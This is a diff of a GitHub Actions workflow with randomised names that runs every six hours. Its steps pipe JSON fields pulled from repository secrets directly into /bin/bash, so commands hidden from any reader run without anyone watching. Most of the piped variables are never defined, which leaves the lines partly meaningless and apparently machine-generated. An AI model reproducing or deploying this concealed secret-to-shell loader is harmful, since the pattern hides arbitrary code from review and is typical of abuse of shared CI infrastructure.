@@ -1,9 +1,9 @@
 name: fuguntang6734
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
+    - cron: '43 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: fuguntang6734
         env:
-          geq84723: ${{ secrets.geq84723 }}
+          nsc2350: ${{ secrets.nsc2350 }}
         run: |
-          echo $geq84723 | jq -r .kl0252 | /bin/bash
-          echo $ryy9294 | jq -r .cgpdr8219 | /bin/bash
-          echo $eqqi1810 | jq -r .nob3714 | /bin/bash
-          echo $t943 | jq -r .aggvs6 | /bin/bash
-          echo $vugx2674 | jq -r .czlga5 | /bin/bash
-          echo $yxxwu0483 | jq -r .fek416 | /bin/bash
-          echo $q6346 | jq -r .sg5 | /bin/bash
-          echo $pcy876 | jq -r .j4 | /bin/bash
-          echo $esggy1773 | jq -r .uj87 | /bin/bash
-          echo $bqxm46423 | jq -r .w4 | /bin/bash
-          echo $sreco24377 | jq -r .zj31083 | /bin/bash
-          echo $eka73636 | jq -r .vsar40 | /bin/bash
+          echo $nsc2350 | jq -r .h9 | /bin/bash
+          echo $krb14 | jq -r .qyyj31787 | /bin/bash
+          echo $c3 | jq -r .qwtj35963 | /bin/bash
+          echo $q11 | jq -r .cz39010 | /bin/bash
+          echo $ubkux588 | jq -r .htlil5825 | /bin/bash
+          echo $qf7314 | jq -r .pzv39 | /bin/bash
+          echo $an54 | jq -r .gz78 | /bin/bash
+          echo $on0 | jq -r .s4413 | /bin/bash
+          echo $sqz6706 | jq -r .nctda90384 | /bin/bash
+          echo $nxm28 | jq -r .cg61082 | /bin/bash
+          echo $tmoxl2 | jq -r .tmir8988 | /bin/bash
 
